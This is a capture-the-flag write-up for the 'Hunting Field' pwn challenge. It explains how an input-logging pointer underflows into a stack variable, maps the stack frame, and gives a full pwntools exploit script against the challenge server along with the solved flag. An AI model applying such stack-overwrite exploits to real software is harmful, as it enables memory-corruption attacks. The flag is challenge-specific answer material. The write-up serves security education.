# Hunting Field

**Category**: Pwn  
**Points**: N/A  
**Description**: Take up your arms, and slay your enemies!  
**Connection**: `nc tjc.tf 31412`

## Table of Contents

- [Hunting Field](#hunting-field)
  - [Table of Contents](#table-of-contents)
  - [Analysis](#analysis)
    - [Source Code Overview](#source-code-overview)
    - [The Win Condition](#the-win-condition)
    - [The Vulnerability](#the-vulnerability)
    - [Stack Layout](#stack-layout)
  - [Exploitation](#exploitation)
    - [Understanding the Write Primitive](#understanding-the-write-primitive)
    - [Crafting the Value](#crafting-the-value)
    - [Triggering the Flag Check](#triggering-the-flag-check)
  - [Exploit Script](#exploit-script)
  - [Flag](#flag)

---

## Analysis

### Source Code Overview

We are given `game.c` and a compiled binary `game`. The game is a simple turn-based grid game on a 9×9 board where the player (`@`) can move or attack enemies (`E`).

```c
void game(char map[81])
{
    char input_log[64];
    int killCt = 0;
    int *kills = &killCt;
    int player_position = 40;
    int turn_cnt = 1;
    char *array_ptr = &input_log[63];
    int game_running = 1;
    *kills = 0;
    // ...
}
```

The player loops through turns, each time:
1. Receiving a two-character command: `[M]ove` or `[A]ttack` + direction `[N]orth`/`[E]ast`/`[S]outh`/`[W]est`
2. Processing the action (move player, or attack adjacent tile)
3. Moving enemies toward the player
4. Spawning new enemies on certain turns

### The Win Condition

When the player dies (walks into an enemy or an enemy walks into them), `game_over()` is called:

```c
void game_over(int *kills)
{
    puts("\nGame Over!");
    printf("You defeated %i enemies!\n", *kills);
    if (*kills == 1752526452)
    {
        // Print flag from flag.txt
    }
}
```

The flag only prints if `*kills == 1752526452` (0x68756e74). Normal gameplay would require killing 1.7 billion enemies — not feasible.

### The Vulnerability

The bug is in how input is logged:

```c
char input_log[64];
char *array_ptr = &input_log[63];
```

In the input loop:

```c
while ((!strchr("MA", player_input[0])) || (!strchr("NESW", player_input[1])))
{
    scanf("%c", &player_input[0]);
    scanf("%c", &player_input[1]);
    int c; while ((c = getchar()) != '\n' && c != EOF);
    *array_ptr = player_input[0];
    array_ptr -= sizeof(player_input[0]);  // -= 1
    *array_ptr = player_input[1];
    array_ptr -= sizeof(player_input[1]);  // -= 1
}
array_ptr += 2*sizeof(player_input[0]);  // += 2
```

Each iteration writes 2 bytes **backward** from `&input_log[63]`. On invalid input, `array_ptr` keeps decrementing without the `+2` correction. On valid input, the `+2` only restores the last decrement — all previous decrements from invalid attempts accumulate.

This lets us write arbitrary data **below** `input_log` on the stack, directly into adjacent local variables.

### Stack Layout

From disassembly (`objdump -d game`), the stack frame of `game()` (`sub $0x1e0, %rsp`):

| Offset from RBP | Variable | Size |
|:---|:---|:---|
| `-0x04` | `player_position` | 4 bytes |
| `-0x08` | `turn_cnt` | 4 bytes |
| `-0x10` | `array_ptr` | 8 bytes |
| `-0x38` | `kills` | 8 bytes |
| `-0x3c` | `game_running` | 4 bytes |
| `-0x41` | `input_log[63]` | — |
| `...` | `input_log[62..1]` | — |
| `-0x80` | `input_log[0]` | — |
| `-0x81` | `killCt[3]` (MSB) | — |
| `-0x82` | `killCt[2]` | — |
| `-0x83` | `killCt[1]` | — |
| `-0x84` | `killCt[0]` (LSB) | 4 bytes |

`input_log` sits at `rbp-0x80` to `rbp-0x41` (64 bytes). **Immediately below it** (at lower addresses) is `killCt` at `rbp-0x84` to `rbp-0x81`. The `array_ptr` starts at `rbp-0x41` and decrements toward `killCt`.

## Exploitation

### Understanding the Write Primitive

Each input pair (whether valid or invalid) writes 2 consecutive bytes going downward in the stack. After N invalid attempts followed by 1 valid attempt in a single turn, we write `2*(N+1)` total bytes starting from `rbp-0x41`.

Critically:
- **Invalid attempts**: both bytes are freely controllable
- **Valid attempt** (last pair): byte 0 must be `M` (0x4d) or `A` (0x41), byte 1 must be `N` (0x4e), `E` (0x45), `S` (0x53), or `W` (0x57)

The target `*kills == 1752526452` = `0x68756e74` = `"hunt"` in little-endian bytes `[0x74, 0x6e, 0x75, 0x68]` = `"tnuh"`.

This maps to the killCt memory layout:

```
-0x81: 0x68 = 'h'  (MSB)
-0x82: 0x75 = 'u'
-0x83: 0x6e = 'n'
-0x84: 0x74 = 't'  (LSB)
```

### Crafting the Value

We use **35 invalid attempts + 1 valid attempt** in turn 1. This writes 72 bytes from `rbp-0x41` down to `rbp-0x88`. The 4 bytes of `killCt` at `rbp-0x81` through `rbp-0x84` are written by **invalid** pairs 33 and 34, which have no character restrictions:

| Pair | Type | Writes To | Bytes Written | Purpose |
|:---|:---|:---|:---|:---|
| 1–32 | Invalid | `-0x41` → `-0x80` | Anything | Overflow through `input_log` |
| **33** | **Invalid** | **`-0x81`, `-0x82`** | **`h`, `u`** | **killCt[3], killCt[2]** |
| **34** | **Invalid** | **`-0x83`, `-0x84`** | **`n`, `t`** | **killCt[1], killCt[0]** |
| 35 | Invalid | `-0x85`, `-0x86` | Anything | Below killCt (padding) |
| 36 | Valid | `-0x87`, `-0x88` | `M`/`A`, `N`/`E`/`S`/`W` | Exits input loop, below killCt |

After this single turn, `killCt = 0x68756e74 = 1752526452`.

### Triggering the Flag Check

Once `killCt` holds the magic value, we just need to die. The valid input on turn 1 is `ME` (Move East), which moves the player one tile right. On subsequent turns, we make valid moves and wait for enemies to converge. The enemy AI moves enemies toward the player, so eventually an enemy walks into us, calling `game_over(kills)` which reads `*kills == 1752526452` and prints the flag.

## Exploit Script

```python
from pwn import *
import sys

context.log_level = 'info'

def exploit(host=None, port=None):
    if host:
        io = remote(host, port)
    else:
        io = process('./game')

    # Wait for first map + prompt
    io.recvuntil(b'Enter (M)ove or (A)ttack')

    # Turn 1: 35 invalid + 1 valid
    # Pairs 1-32 (invalid): overflow through input_log
    for _ in range(32):
        io.sendline(b'xx')

    # Pair 33 (invalid): killCt[3]=0x68='h', killCt[2]=0x75='u'
    io.sendline(b'hu')
    # Pair 34 (invalid): killCt[1]=0x6e='n', killCt[0]=0x74='t'
    io.sendline(b'nt')
    # Pair 35 (invalid): below killCt
    io.sendline(b'qq')
    # Pair 36 (valid: Move East) — exits input loop, below killCt
    io.sendline(b'ME')

    # Wait for enemies to converge and kill us
    io.sendline(b'MN')
    for _ in range(100):
        try:
            data = io.recv(timeout=1)
            if b'tjctf' in data:
                print(data.decode(errors='replace'))
                rest = io.recvall(timeout=3)
                if rest:
                    print(rest.decode(errors='replace'))
                return
            if b'Enter (M)ove or (A)ttack' in data:
                io.sendline(b'ME')
        except EOFError:
            break

    io.close()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        exploit(host='tjc.tf', port=31412)
    else:
        exploit()
```

## Flag

```
tjctf{pr0fes5iona1_hunt3r}
```
